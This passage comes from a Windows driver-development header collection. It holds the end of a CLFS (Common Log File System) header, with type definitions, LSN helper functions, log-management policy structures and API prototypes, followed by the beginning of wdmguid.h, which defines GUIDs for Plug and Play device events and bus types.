typedef CLS_CONTAINER_INFORMATION CLFS_CONTAINER_INFORMATION, *PCLFS_CONTAINER_INFORMATION, **PPCLFS_CONTAINER_INFORMATION;

typedef enum _CLS_LOG_INFORMATION_CLASS {
  ClfsLogBasicInformation,
  ClfsLogBasicInformationPhysical,
  ClfsLogPhysicalNameInformation,
  ClfsLogStreamIdentifierInformation,
#if NTDDI_VERSION >= NTDDI_VISTA || _WIN32_WINNT >= _WIN32_WINNT_VISTA
  ClfsLogSystemMarkingInformation,
  ClfsLogPhysicalLsnInformation
#endif
} CLS_LOG_INFORMATION_CLASS, *PCLS_LOG_INFORMATION_CLASS, **PPCLS_LOG_INFORMATION_CLASS;

typedef CLS_LOG_INFORMATION_CLASS CLFS_LOG_INFORMATION_CLASS, *PCLFS_LOG_INFORMATION_CLASS, **PPCLFS_LOG_INFORMATION_CLASS;

typedef enum _CLS_IOSTATS_CLASS {
  ClsIoStatsDefault = 0x0000,
  ClsIoStatsMax = 0xffff
} CLS_IOSTATS_CLASS, *PCLS_IOSTATS_CLASS, **PPCLS_IOSTATS_CLASS;

typedef enum _CLFS_IOSTATS_CLASS {
  ClfsIoStatsDefault = 0x0000,
  ClfsIoStatsMax = 0xffff
} CLFS_IOSTATS_CLASS, *PCLFS_IOSTATS_CLASS, **PPCLFS_IOSTATS_CLASS;

typedef struct _CLS_IO_STATISTICS_HEADER {
  UCHAR ubMajorVersion;
  UCHAR ubMinorVersion;
  CLFS_IOSTATS_CLASS eStatsClass;
  USHORT cbLength;
  ULONG coffData;
} CLS_IO_STATISTICS_HEADER, *PCLS_IO_STATISTICS_HEADER, **PPCLS_IO_STATISTICS_HEADER;

typedef CLS_IO_STATISTICS_HEADER CLFS_IO_STATISTICS_HEADER, *PCLFS_IO_STATISTICS_HEADER, **PPCLFS_IO_STATISTICS_HEADER;

typedef struct _CLS_IO_STATISTICS {
  CLS_IO_STATISTICS_HEADER hdrIoStats;
  ULONGLONG cFlush;
  ULONGLONG cbFlush;
  ULONGLONG cMetaFlush;
  ULONGLONG cbMetaFlush;
} CLS_IO_STATISTICS, *PCLS_IO_STATISTICS, **PPCLS_IO_STATISTICS;

typedef CLS_IO_STATISTICS CLFS_IO_STATISTICS, *PCLFS_IO_STATISTICS, **PPCLFS_IO_STATISTICS;

#define CLFS_SCAN_INIT          0x01
#define CLFS_SCAN_FORWARD       0x02
#define CLFS_SCAN_BACKWARD      0x04
#define CLFS_SCAN_CLOSE         0x08
#define CLFS_SCAN_INITIALIZED   0x10
#define CLFS_SCAN_BUFFERED      0x20

typedef UCHAR CLFS_SCAN_MODE, *PCLFS_SCAN_MODE;

typedef FILE_OBJECT LOG_FILE_OBJECT, *PLOG_FILE_OBJECT, **PPLOG_FILE_OBJECT;

typedef struct _CLS_SCAN_CONTEXT {
  CLFS_NODE_ID cidNode;
  PLOG_FILE_OBJECT plfoLog;
  ULONG cIndex __attribute__((aligned(8)));
  ULONG cContainers __attribute__((aligned(8)));
  ULONG cContainersReturned __attribute__((aligned(8)));
  CLFS_SCAN_MODE eScanMode __attribute__((aligned(8)));
  PCLS_CONTAINER_INFORMATION pinfoContainer __attribute__((aligned(8)));
} CLS_SCAN_CONTEXT, *PCLS_SCAN_CONTEXT, **PPCLS_SCAN_CONTEXT;

typedef CLS_SCAN_CONTEXT CLFS_SCAN_CONTEXT, *PCLFS_SCAN_CONTEXT, **PPCLFS_SCAN_CONTEXT;

typedef struct _CLS_ARCHIVE_DESCRIPTOR {
  ULONGLONG coffLow;
  ULONGLONG coffHigh;
  CLS_CONTAINER_INFORMATION infoContainer;
} CLS_ARCHIVE_DESCRIPTOR, *PCLS_ARCHIVE_DESCRIPTOR, **PPCLS_ARCHIVE_DESCRIPTOR;

typedef CLS_ARCHIVE_DESCRIPTOR CLFS_ARCHIVE_DESCRIPTOR, *PCLFS_ARCHIVE_DESCRIPTOR, **PPCLFS_ARCHIVE_DESCRIPTOR;

typedef PVOID (*CLFS_BLOCK_ALLOCATION)(ULONG cbBufferLength, PVOID pvUserContext);
typedef void (*CLFS_BLOCK_DEALLOCATION)(PVOID pvBuffer, PVOID pvUserContext);

typedef enum _CLFS_LOG_ARCHIVE_MODE {
  ClfsLogArchiveEnabled = 1,
  ClfsLogArchiveDisabled = 2
} CLFS_LOG_ARCHIVE_MODE, *PCLFS_LOG_ARCHIVE_MODE;

CLFSUSER_API
BOOLEAN
NTAPI
ClfsLsnEqual(
  const CLFS_LSN* plsn1,
  const CLFS_LSN* plsn2);

CLFSUSER_API
BOOLEAN
NTAPI
ClfsLsnLess(
  const CLFS_LSN* plsn1,
  const CLFS_LSN* plsn2);

CLFSUSER_API
BOOLEAN
NTAPI
ClfsLsnGreater(
  const CLFS_LSN* plsn1,
  const CLFS_LSN* plsn2);

CLFSUSER_API
BOOLEAN
NTAPI
ClfsLsnNull(
  const CLFS_LSN* plsn);

CLFSUSER_API
CLFS_CONTAINER_ID
NTAPI
ClfsLsnContainer(
  const CLFS_LSN* plsn);

CLFSUSER_API
CLFS_LSN
NTAPI
ClfsLsnCreate(
  CLFS_CONTAINER_ID cidContainer,
  ULONG offBlock,
  ULONG cRecord);

CLFSUSER_API
ULONG
NTAPI
ClfsLsnBlockOffset(
  const CLFS_LSN* plsn);

CLFSUSER_API
ULONG
NTAPI
ClfsLsnRecordSequence(
  const CLFS_LSN* plsn);

CLFSUSER_API
BOOLEAN
NTAPI
ClfsLsnInvalid(
  const CLFS_LSN* plsn);

CLFSUSER_API
CLFS_LSN
NTAPI
ClfsLsnIncrement(
  PCLFS_LSN  plsn);

#ifdef __cplusplus
#ifdef CLFS_OPERATORS

inline CLFS_LSN operator++(CLFS_LSN& refLsn) {
  refLsn = ClfsLsnIncrement (&refLsn);
  return refLsn;
}

inline BOOLEAN operator<(const CLFS_LSN& refLsn1, const CLFS_LSN& refLsn2) {
  return ClfsLsnLess(&refLsn1, &refLsn2);
}

inline BOOLEAN operator>(const CLFS_LSN& refLsn1, const CLFS_LSN& refLsn2) {
  return ClfsLsnGreater(&refLsn1, &refLsn2);
}

inline BOOLEAN operator==(const CLFS_LSN& refLsn1, const CLFS_LSN& refLsn2) {
  return ClfsLsnEqual(&refLsn1, &refLsn2);
}

inline BOOLEAN operator!=(const CLFS_LSN& refLsn1, const CLFS_LSN& refLsn2) {
  return !ClfsLsnEqual(&refLsn1, &refLsn2);
}

inline BOOLEAN operator<=(const CLFS_LSN& refLsn1, const CLFS_LSN& refLsn2) {
  return !ClfsLsnGreater(&refLsn1, &refLsn2);
}

inline BOOLEAN operator>=(const CLFS_LSN& refLsn1, const CLFS_LSN& refLsn2) {
  return !ClfsLsnLess(&refLsn1, &refLsn2);
}

#endif
#endif
#endif

#if NTDDI_VERSION >= NTDDI_VISTA || _WIN32_WINNT >= _WIN32_WINNT_VISTA

#pragma pack(push,8)

typedef struct _CLFS_PHYSICAL_LSN_INFORMATION {
  UCHAR StreamIdentifier;
  CLFS_LSN VirtualLsn;
  CLFS_LSN PhysicalLsn;
} CLFS_PHYSICAL_LSN_INFORMATION, *PCLFS_PHYSICAL_LSN_INFORMATION;

#pragma pack(pop)

#endif

#endif /* _CLFS_PUBLIC_H_ */

#if NTDDI_VERSION >= NTDDI_WS03SP1 || _WIN32_WINNT >= _WIN32_WINNT_WS03

typedef enum _CLFS_MGMT_POLICY_TYPE {
  ClfsMgmtPolicyMaximumSize,
  ClfsMgmtPolicyMinimumSize,
  ClfsMgmtPolicyNewContainerSize,
  ClfsMgmtPolicyGrowthRate,
  ClfsMgmtPolicyLogTail,
  ClfsMgmtPolicyAutoShrink,
  ClfsMgmtPolicyAutoGrow,
  ClfsMgmtPolicyNewContainerPrefix,
  ClfsMgmtPolicyNewContainerSuffix,
  ClfsMgmtPolicyNewContainerExtension,
  ClfsMgmtPolicyInvalid
} CLFS_MGMT_POLICY_TYPE, *PCLFS_MGMT_POLICY_TYPE;

#define CLFS_MGMT_NUM_POLICIES (ULONG)ClfsMgmtPolicyInvalid

#define CLFS_LOG_SIZE_MINIMUM (ULONGLONG)0
#define CLFS_LOG_SIZE_MAXIMUM (ULONGLONG)-1

#define CLFS_MGMT_POLICY_VERSION  1

#define LOG_POLICY_OVERWRITE      0x01
#define LOG_POLICY_PERSIST        0x02

typedef struct _CLFS_MGMT_POLICY {
  ULONG Version;
  ULONG LengthInBytes;
  ULONG PolicyFlags;
  CLFS_MGMT_POLICY_TYPE PolicyType;
  union {
    struct {
      ULONG Containers;
    } MaximumSize;
    struct {
      ULONG Containers;
    } MinimumSize;
    struct {
      ULONG SizeInBytes;
    } NewContainerSize;
    struct {
      ULONG AbsoluteGrowthInContainers;
      ULONG RelativeGrowthPercentage;
    } GrowthRate;
    struct {
      ULONG MinimumAvailablePercentage;
      ULONG MinimumAvailableContainers;
    } LogTail;
    struct {
      ULONG Percentage;
    } AutoShrink;
    struct {
      ULONG Enabled;
    } AutoGrow;
    struct {
      USHORT PrefixLengthInBytes;
      WCHAR PrefixString[1];
    } NewContainerPrefix;
    struct {
      ULONGLONG NextContainerSuffix;
    } NewContainerSuffix;
    struct {
      USHORT ExtensionLengthInBytes;
      WCHAR ExtensionString[1];
    } NewContainerExtension;
  } PolicyParameters;
} CLFS_MGMT_POLICY, *PCLFS_MGMT_POLICY;

typedef enum _CLFS_MGMT_NOTIFICATION_TYPE {
  ClfsMgmtAdvanceTailNotification,
  ClfsMgmtLogFullHandlerNotification,
  ClfsMgmtLogUnpinnedNotification,
  ClfsMgmtLogWriteNotification
} CLFS_MGMT_NOTIFICATION_TYPE, *PCLFS_MGMT_NOTIFICATION_TYPE;

typedef struct _CLFS_MGMT_NOTIFICATION {
  CLFS_MGMT_NOTIFICATION_TYPE Notification;
  CLFS_LSN Lsn;
  USHORT LogIsPinned;
} CLFS_MGMT_NOTIFICATION, *PCLFS_MGMT_NOTIFICATION;

typedef NTSTATUS (*PCLFS_CLIENT_ADVANCE_TAIL_CALLBACK)(
  PLOG_FILE_OBJECT LogFile,
  PCLFS_LSN TargetLsn,
  PVOID ClientData);

typedef VOID (*PCLFS_CLIENT_LFF_HANDLER_COMPLETE_CALLBACK)(
  PLOG_FILE_OBJECT LogFile,
  NTSTATUS OperationStatus,
  BOOLEAN LogIsPinned,
  PVOID ClientData);

typedef VOID (*PCLFS_CLIENT_LOG_UNPINNED_CALLBACK)(
  PLOG_FILE_OBJECT LogFile,
  PVOID ClientData);

typedef VOID (*PCLFS_SET_LOG_SIZE_COMPLETE_CALLBACK)(
  PLOG_FILE_OBJECT LogFile,
  NTSTATUS OperationStatus,
  PVOID ClientData);

#define CLFS_MGMT_CLIENT_REGISTRATION_VERSION 1

typedef struct _CLFS_MGMT_CLIENT_REGISTRATION {
  ULONG Version;
  PCLFS_CLIENT_ADVANCE_TAIL_CALLBACK AdvanceTailCallback;
  PVOID AdvanceTailCallbackData;
  PCLFS_CLIENT_LFF_HANDLER_COMPLETE_CALLBACK LogGrowthCompleteCallback;
  PVOID LogGrowthCompleteCallbackData;
  PCLFS_CLIENT_LOG_UNPINNED_CALLBACK LogUnpinnedCallback;
  PVOID LogUnpinnedCallbackData;
} CLFS_MGMT_CLIENT_REGISTRATION, *PCLFS_MGMT_CLIENT_REGISTRATION;

typedef PVOID CLFS_MGMT_CLIENT, *PCLFS_MGMT_CLIENT;

CLFSUSER_API
NTSTATUS
ClfsMgmtRegisterManagedClient(
  PLOG_FILE_OBJECT LogFile,
  PCLFS_MGMT_CLIENT_REGISTRATION RegistrationData,
  PCLFS_MGMT_CLIENT ClientCookie);

CLFSUSER_API
NTSTATUS
ClfsMgmtDeregisterManagedClient(
  CLFS_MGMT_CLIENT ClientCookie);

CLFSUSER_API
NTSTATUS
ClfsMgmtTailAdvanceFailure(
  CLFS_MGMT_CLIENT Client,
  NTSTATUS Reason);

CLFSUSER_API
NTSTATUS
ClfsMgmtHandleLogFileFull(
  CLFS_MGMT_CLIENT Client);

CLFSUSER_API
NTSTATUS
ClfsMgmtInstallPolicy(
  PLOG_FILE_OBJECT LogFile,
  PCLFS_MGMT_POLICY Policy,
  ULONG PolicyLength);

CLFSUSER_API
NTSTATUS
ClfsMgmtQueryPolicy(
  PLOG_FILE_OBJECT LogFile,
  CLFS_MGMT_POLICY_TYPE PolicyType,
  PCLFS_MGMT_POLICY Policy,
  PULONG PolicyLength);

CLFSUSER_API
NTSTATUS
ClfsMgmtRemovePolicy(
  PLOG_FILE_OBJECT LogFile,
  CLFS_MGMT_POLICY_TYPE PolicyType);

CLFSUSER_API
NTSTATUS
ClfsMgmtSetLogFileSize(
  PLOG_FILE_OBJECT LogFile,
  PULONGLONG NewSizeInContainers,
  PULONGLONG ResultingSizeInContainers,
  PCLFS_SET_LOG_SIZE_COMPLETE_CALLBACK CompletionRoutine,
  PVOID CompletionRoutineData);

#endif

#if NTDDI_VERSION >= NTDDI_VISTA || _WIN32_WINNT >= _WIN32_WINNT_VISTA

CLFSUSER_API
NTSTATUS
ClfsMgmtSetLogFileSizeAsClient(
  PLOG_FILE_OBJECT LogFile,
  PCLFS_MGMT_CLIENT ClientCookie,
  PULONGLONG NewSizeInContainers,
  PULONGLONG ResultingSizeInContainers,
  PCLFS_SET_LOG_SIZE_COMPLETE_CALLBACK CompletionRoutine,
  PVOID CompletionRoutineData);

#endif

#ifndef __CLFSPROC_H__
#define __CLFSPROC_H__

#if NTDDI_VERSION >= NTDDI_WS03SP1

CLFSUSER_API NTSTATUS ClfsInitialize(void);

CLFSUSER_API void ClfsFinalize(void);

CLFSUSER_API
NTSTATUS
ClfsCreateLogFile(
  PPLOG_FILE_OBJECT pplfoLog,
  PUNICODE_STRING puszLogFileName,
  ACCESS_MASK fDesiredAccess,
  ULONG dwShareMode,
  PSECURITY_DESCRIPTOR psdLogFile,
  ULONG fCreateDisposition,
  ULONG fCreateOptions,
  ULONG fFlagsAndAttributes,
  ULONG fLogOptionFlag,
  PVOID pvContext,
  ULONG cbContext);

CLFSUSER_API
NTSTATUS
ClfsDeleteLogByPointer(
  PLOG_FILE_OBJECT plfoLog);

CLFSUSER_API
NTSTATUS
ClfsDeleteLogFile(
  PUNICODE_STRING puszLogFileName,
  PVOID pvReserved,
  ULONG fLogOptionFlag,
  PVOID pvContext,
  ULONG cbContext);

CLFSUSER_API
NTSTATUS
ClfsAddLogContainer(
  PLOG_FILE_OBJECT plfoLog,
  PULONGLONG pcbContainer,
  PUNICODE_STRING puszContainerPath);

CLFSUSER_API
NTSTATUS
ClfsAddLogContainerSet(
  PLOG_FILE_OBJECT plfoLog,
  USHORT cContainers,
  PULONGLONG pcbContainer,
  PUNICODE_STRING rguszContainerPath);

CLFSUSER_API
NTSTATUS
ClfsRemoveLogContainer(
  PLOG_FILE_OBJECT plfoLog,
  PUNICODE_STRING puszContainerPath,
  BOOLEAN fForce);

CLFSUSER_API
NTSTATUS
ClfsRemoveLogContainerSet(
  PLOG_FILE_OBJECT plfoLog,
  USHORT cContainers,
  PUNICODE_STRING rgwszContainerPath,
  BOOLEAN fForce);

CLFSUSER_API
NTSTATUS
ClfsSetArchiveTail(
  PLOG_FILE_OBJECT plfoLog,
  PCLFS_LSN plsnArchiveTail);

CLFSUSER_API
NTSTATUS
ClfsSetEndOfLog(
  PLOG_FILE_OBJECT plfoLog,
  PCLFS_LSN plsnEnd);

CLFSUSER_API
NTSTATUS
ClfsCreateScanContext(
  PLOG_FILE_OBJECT plfoLog,
  ULONG cFromContainer,
  ULONG cContainers,
  CLFS_SCAN_MODE eScanMode,
  PCLFS_SCAN_CONTEXT pcxScan);

CLFSUSER_API
NTSTATUS
ClfsScanLogContainers(
  PCLFS_SCAN_CONTEXT pcxScan,
  CLFS_SCAN_MODE eScanMode);

CLFSUSER_API
NTSTATUS
ClfsGetContainerName(
  PLOG_FILE_OBJECT plfoLog,
  CLFS_CONTAINER_ID cidLogicalContainer,
  PUNICODE_STRING puszContainerName,
  PULONG pcActualLenContainerName);

CLFSUSER_API
NTSTATUS
ClfsGetLogFileInformation(
  PLOG_FILE_OBJECT plfoLog,
  PCLFS_INFORMATION pinfoBuffer,
  PULONG pcbInfoBuffer);

CLFSUSER_API
NTSTATUS
ClfsSetLogFileInformation(
  PLOG_FILE_OBJECT plfoLog,
  CLFS_LOG_INFORMATION_CLASS eInformationClass,
  PVOID pinfoBuffer,
  ULONG cbBuffer);

CLFSUSER_API
NTSTATUS
ClfsReadRestartArea(
  PVOID pvMarshalContext,
  PVOID* ppvRestartBuffer,
  PULONG pcbRestartBuffer,
  PCLFS_LSN plsn,
  PVOID* ppvReadContext);

CLFSUSER_API
NTSTATUS
ClfsReadPreviousRestartArea(
  PVOID pvReadContext,
  PVOID* ppvRestartBuffer,
  PULONG pcbRestartBuffer,
  PCLFS_LSN plsnRestart);

CLFSUSER_API
NTSTATUS
ClfsWriteRestartArea(
  PVOID pvMarshalContext,
  PVOID pvRestartBuffer,
  ULONG cbRestartBuffer,
  PCLFS_LSN plsnBase,
  ULONG fFlags,
  PULONG pcbWritten,
  PCLFS_LSN plsnNext);

CLFSUSER_API
NTSTATUS
ClfsAdvanceLogBase(
  PVOID pvMarshalContext,
  PCLFS_LSN plsnBase,
  ULONG fFlags);

CLFSUSER_API
NTSTATUS
ClfsCloseAndResetLogFile(
  PLOG_FILE_OBJECT plfoLog);

CLFSUSER_API
NTSTATUS
ClfsCloseLogFileObject(
  PLOG_FILE_OBJECT plfoLog);

CLFSUSER_API
NTSTATUS
ClfsCreateMarshallingArea(
  PLOG_FILE_OBJECT plfoLog,
  POOL_TYPE ePoolType,
  PALLOCATE_FUNCTION pfnAllocBuffer,
  PFREE_FUNCTION pfnFreeBuffer,
  ULONG cbMarshallingBuffer,
  ULONG cMaxWriteBuffers,
  ULONG cMaxReadBuffers,
  PVOID* ppvMarshalContext);

CLFSUSER_API
NTSTATUS
ClfsDeleteMarshallingArea(
  PVOID pvMarshalContext);

CLFSUSER_API
NTSTATUS
ClfsReserveAndAppendLog(
  PVOID pvMarshalContext,
  PCLFS_WRITE_ENTRY rgWriteEntries,
  ULONG cWriteEntries,
  PCLFS_LSN plsnUndoNext,
  PCLFS_LSN plsnPrevious,
  ULONG cReserveRecords,
  PLONGLONG rgcbReservation,
  ULONG fFlags,
  PCLFS_LSN plsn);

CLFSUSER_API
NTSTATUS
ClfsReserveAndAppendLogAligned(
  PVOID pvMarshalContext,
  PCLFS_WRITE_ENTRY rgWriteEntries,
  ULONG cWriteEntries,
  ULONG cbEntryAlignment,
  PCLFS_LSN plsnUndoNext,
  PCLFS_LSN plsnPrevious,
  ULONG cReserveRecords,
  PLONGLONG rgcbReservation,
  ULONG fFlags,
  PCLFS_LSN plsn);

CLFSUSER_API
NTSTATUS
ClfsAlignReservedLog(
  PVOID pvMarshalContext,
  ULONG cRecords,
  LONGLONG rgcbReservation[],
  PLONGLONG pcbAlignReservation);

CLFSUSER_API
NTSTATUS
ClfsAllocReservedLog(
  PVOID pvMarshalContext,
  ULONG cRecords,
  PLONGLONG pcbAdjustment);

CLFSUSER_API
NTSTATUS
ClfsFreeReservedLog(
  PVOID pvMarshalContext,
  ULONG cRecords,
  PLONGLONG pcbAdjustment);

CLFSUSER_API
NTSTATUS
ClfsFlushBuffers(
  PVOID pvMarshalContext);

CLFSUSER_API
NTSTATUS
ClfsFlushToLsn(
  PVOID pvMarshalContext,
  PCLFS_LSN plsnFlush,
  PCLFS_LSN plsnLastFlushed);

CLFSUSER_API
NTSTATUS
ClfsReadLogRecord(
  PVOID pvMarshalContext,
  PCLFS_LSN plsnFirst,
  CLFS_CONTEXT_MODE peContextMode,
  PVOID* ppvReadBuffer,
  PULONG pcbReadBuffer,
  PCLFS_RECORD_TYPE peRecordType,
  PCLFS_LSN plsnUndoNext,
  PCLFS_LSN plsnPrevious,
  PVOID* ppvReadContext);

CLFSUSER_API
NTSTATUS
ClfsReadNextLogRecord(
  PVOID pvReadContext,
  PVOID* ppvBuffer,
  PULONG pcbBuffer,
  PCLFS_RECORD_TYPE peRecordType,
  PCLFS_LSN plsnUser,
  PCLFS_LSN plsnUndoNext,
  PCLFS_LSN plsnPrevious,
  PCLFS_LSN plsnRecord);

CLFSUSER_API
NTSTATUS
ClfsTerminateReadLog(
  PVOID pvCursorContext);

CLFSUSER_API
NTSTATUS
ClfsGetLastLsn(
  PLOG_FILE_OBJECT plfoLog,
  PCLFS_LSN plsnLast);

CLFSUSER_API
NTSTATUS
ClfsGetIoStatistics(
  PLOG_FILE_OBJECT plfoLog,
  PVOID pvStatsBuffer,
  ULONG cbStatsBuffer,
  CLFS_IOSTATS_CLASS eStatsClass,
  PULONG pcbStatsWritten);

CLFSUSER_API
CLFS_LSN
ClfsLaterLsn(
  PCLFS_LSN plsn);

CLFSUSER_API
CLFS_LSN
ClfsEarlierLsn(
  PCLFS_LSN plsn);

CLFSUSER_API
NTSTATUS
ClfsLsnDifference(
  PCLFS_LSN plsnStart,
  PCLFS_LSN plsnFinish,
  ULONG cbContainer,
  ULONG cbMaxBlock,
  PLONGLONG pcbDifference);

#endif

#if NTDDI_VERSION >= NTDDI_VISTA

CLFSUSER_API
BOOLEAN
ClfsValidTopLevelContext(
  PIRP pirpTopLevelContext);

CLFSUSER_API
NTSTATUS
ClfsQueryLogFileInformation(
  PLOG_FILE_OBJECT plfoLog,
  CLFS_LOG_INFORMATION_CLASS eInformationClass,
  PVOID pinfoInputBuffer,
  ULONG cbinfoInputBuffer,
  PVOID pinfoBuffer,
  PULONG pcbInfoBuffer);

#endif

#if NTDDI_VERSION >= NTDDI_WIN8

CLFSUSER_API
NTSTATUS
ClfsCreateMarshallingAreaEx(
  PLOG_FILE_OBJECT plfoLog,
  POOL_TYPE ePoolType,
  PALLOCATE_FUNCTION pfnAllocBuffer,
  PFREE_FUNCTION pfnFreeBuffer,
  ULONG cbMarshallingBuffer,
  ULONG cMaxWriteBuffers,
  ULONG cMaxReadBuffers,
  ULONG cAlignmentSize,
  ULONGLONG fFlags,
  PVOID* ppvMarshalContext);

#endif

#endif /* __CLFSPROC_H__ */

#ifdef __cplusplus
}
#endif

#endif /* !_WDMDDK_ */

```

`include/ddk/wdmguid.h`:

```h
/*
 * wdmguid.h
 *
 * GUID definitions for PnP device classes and device events.
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Filip Navara <xnavara@volny.cz>.
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __WDMGUID_H
#define __WDMGUID_H

DEFINE_GUID(GUID_HWPROFILE_QUERY_CHANGE,
  0xcb3a4001, 0x46f0, 0x11d0, 0xb0, 0x8f, 0x00, 0x60, 0x97, 0x13, 0x05, 0x3f);
DEFINE_GUID(GUID_HWPROFILE_CHANGE_CANCELLED,
  0xcb3a4002, 0x46f0, 0x11d0, 0xb0, 0x8f, 0x00, 0x60, 0x97, 0x13, 0x05, 0x3f);
DEFINE_GUID(GUID_HWPROFILE_CHANGE_COMPLETE,
  0xcb3a4003, 0x46f0, 0x11d0, 0xb0, 0x8f, 0x00, 0x60, 0x97, 0x13, 0x05, 0x3f);
DEFINE_GUID(GUID_DEVICE_INTERFACE_ARRIVAL,
  0xcb3a4004, 0x46f0, 0x11d0, 0xb0, 0x8f, 0x00, 0x60, 0x97, 0x13, 0x05, 0x3f);
DEFINE_GUID(GUID_DEVICE_INTERFACE_REMOVAL,
  0xcb3a4005, 0x46f0, 0x11d0, 0xb0, 0x8f, 0x00, 0x60, 0x97, 0x13, 0x05, 0x3f);
DEFINE_GUID(GUID_TARGET_DEVICE_QUERY_REMOVE,
  0xcb3a4006, 0x46f0, 0x11d0, 0xb0, 0x8f, 0x00, 0x60, 0x97, 0x13, 0x05, 0x3f);
DEFINE_GUID(GUID_TARGET_DEVICE_REMOVE_CANCELLED,
  0xcb3a4007, 0x46f0, 0x11d0, 0xb0, 0x8f, 0x00, 0x60, 0x97, 0x13, 0x05, 0x3f);
DEFINE_GUID(GUID_TARGET_DEVICE_REMOVE_COMPLETE,
  0xcb3a4008, 0x46f0, 0x11d0, 0xb0, 0x8f, 0x00, 0x60, 0x97, 0x13, 0x05, 0x3f);
DEFINE_GUID(GUID_PNP_CUSTOM_NOTIFICATION,
  0xaca73f8e, 0x8d23, 0x11d1, 0xac, 0x7d, 0x00, 0x00, 0xf8, 0x75, 0x71, 0xd0);
DEFINE_GUID(GUID_PNP_POWER_NOTIFICATION,
  0xc2cf0660, 0xeb7a, 0x11d1, 0xbd, 0x7f, 0x00, 0x00, 0xf8, 0x75, 0x71, 0xd0);

DEFINE_GUID(GUID_BUS_INTERFACE_STANDARD,
  0x496b8280, 0x6f25, 0x11d0, 0xbe, 0xaf, 0x08, 0x00, 0x2b, 0xe2, 0x09, 0x2f);
DEFINE_GUID(GUID_PCI_BUS_INTERFACE_STANDARD,
  0x496b8281, 0x6f25, 0x11d0, 0xbe, 0xaf, 0x08, 0x00, 0x2b, 0xe2, 0x09, 0x2f);
DEFINE_GUID(GUID_AGP_TARGET_BUS_INTERFACE_STANDARD,
  0xb15cfce8, 0x06d1, 0x4d37, 0x9d, 0x4c, 0xbe, 0xdd, 0xe0, 0xc2, 0xa6, 0xff);
DEFINE_GUID(GUID_ARBITER_INTERFACE_STANDARD,
  0xe644f185, 0x8c0e, 0x11d0, 0xbe, 0xcf, 0x08, 0x00, 0x2b, 0xe2, 0x09, 0x2f);
DEFINE_GUID(GUID_TRANSLATOR_INTERFACE_STANDARD,
  0x6c154a92, 0xaacf, 0x11d0, 0x8d, 0x2a, 0x00, 0xa0, 0xc9, 0x06, 0xb2, 0x44);
DEFINE_GUID(GUID_ACPI_INTERFACE_STANDARD,
  0xb091a08a, 0xba97, 0x11d0, 0xbd, 0x14, 0x00, 0xaa, 0x00, 0xb7, 0xb3, 0x2a);
DEFINE_GUID(GUID_INT_ROUTE_INTERFACE_STANDARD,
  0x70941bf4, 0x0073, 0x11d1, 0xa0, 0x9e, 0x00, 0xc0, 0x4f, 0xc3, 0x40, 0xb1);
DEFINE_GUID(GUID_PCMCIA_BUS_INTERFACE_STANDARD,
  0x76173af0, 0xc504, 0x11d1, 0x94, 0x7f, 0x00, 0xc0, 0x4f, 0xb9, 0x60, 0xee);
DEFINE_GUID(GUID_ACPI_REGS_INTERFACE_STANDARD,
  0x06141966, 0x7245, 0x6369, 0x46, 0x2e, 0x4e, 0x65, 0x6c, 0x73, 0x6f, 0x6e);
DEFINE_GUID(GUID_LEGACY_DEVICE_DETECTION_STANDARD,
  0x50feb0de, 0x596a, 0x11d2, 0xa5, 0xb8, 0x00, 0x00, 0xf8, 0x1a, 0x46, 0x19);
DEFINE_GUID(GUID_PCI_DEVICE_PRESENT_INTERFACE,
  0xd1b82c26, 0xbf49, 0x45ef, 0xb2, 0x16, 0x71, 0xcb, 0xd7, 0x88, 0x9b, 0x57);
DEFINE_GUID(GUID_MF_ENUMERATION_INTERFACE,
  0xaeb895f0, 0x5586, 0x11d1, 0x8d, 0x84, 0x00, 0xa0, 0xc9, 0x06, 0xb2, 0x44);
DEFINE_GUID(GUID_ACPI_CMOS_INTERFACE_STANDARD,
  0x3a8d0384, 0x6505, 0x40ca, 0xbc, 0x39, 0x56, 0xc1, 0x5f, 0x8c, 0x5f, 0xed);
DEFINE_GUID(GUID_ACPI_PORT_RANGES_INTERFACE_STANDARD,
  0xf14f609b, 0xcbbd, 0x4957, 0xa6, 0x74, 0xbc, 0x00, 0x21, 0x3f, 0x1c, 0x97);
DEFINE_GUID(GUID_PNP_LOCATION_INTERFACE,
  0x70211b0e, 0x0afb, 0x47db, 0xaf, 0xc1, 0x41, 0x0b, 0xf8, 0x42, 0x49, 0x7a);

DEFINE_GUID(GUID_BUS_TYPE_INTERNAL,
  0x1530ea73, 0x086b, 0x11d1, 0xa0, 0x9f, 0x00, 0xc0, 0x4f, 0xc3, 0x40, 0xb1);
DEFINE_GUID(GUID_BUS_TYPE_PCMCIA,
  0x09343630, 0xaf9f, 0x11d0, 0x92, 0xE9, 0x00, 0x00, 0xf8, 0x1e, 0x1b, 0x30);
DEFINE_GUID(GUID_BUS_TYPE_PCI,
  0xc8ebdfb0, 0xb510, 0x11d0, 0x80, 0xe5, 0x00, 0xa0, 0xc9, 0x25, 0x42, 0xe3);
DEFINE_GUID(GUID_BUS_TYPE_ISAPNP,
  0xe676f854, 0xd87d, 0x11d0, 0x92, 0xb2, 0x00, 0xa0, 0xc9, 0x05, 0x5f, 0xc5);
DEFINE_GUID(GUID_BUS_TYPE_EISA,
  0xddc35509, 0xf3fc, 0x11d0, 0xa5, 0x37, 0x00, 0x00, 0xf8, 0x75, 0x3e, 0xd1);
DEFINE_GUID(GUID_BUS_TYPE_MCA,
  0x1c75997a, 0xdc33, 0x11d0, 0x92, 0xb2, 0x00, 0xa0, 0xc9, 0x05, 0x5f, 0xc5);
DEFINE_GUID(GUID_BUS_TYPE_LPTENUM,
  0xc4ca1000, 0x2ddc, 0x11d5, 0xa1, 0x7a, 0x00, 0xc0, 0x4f, 0x60, 0x52, 0x4d);
DEFINE_GUID(GUID_BUS_TYPE_USBPRINT,
  0x441ee000, 0x4342, 0x11d5, 0xa1, 0x84, 0x00, 0xc0, 0x4f, 0x60, 0x52, 0x4d);
DEFINE_GUID(GUID_BUS_TYPE_DOT4PRT,
  0x441ee001, 0x4342, 0x11d5, 0xa1, 0x84, 0x00, 0xc0, 0x4f, 0x60, 0x52, 0x4d);
